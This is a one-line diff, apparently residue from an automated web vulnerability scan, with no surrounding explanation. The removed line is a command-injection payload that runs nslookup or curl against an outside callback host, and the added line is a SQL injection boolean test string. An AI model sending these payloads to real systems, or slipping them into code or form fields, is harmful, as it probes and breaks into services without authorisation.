@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitckysonjarw78e1b.bxss.me||curl hitckysonjarw78e1b.bxss.me)
+-1' OR 2+172-172-1=0+0+0+1 or 'o8puKrqz'='
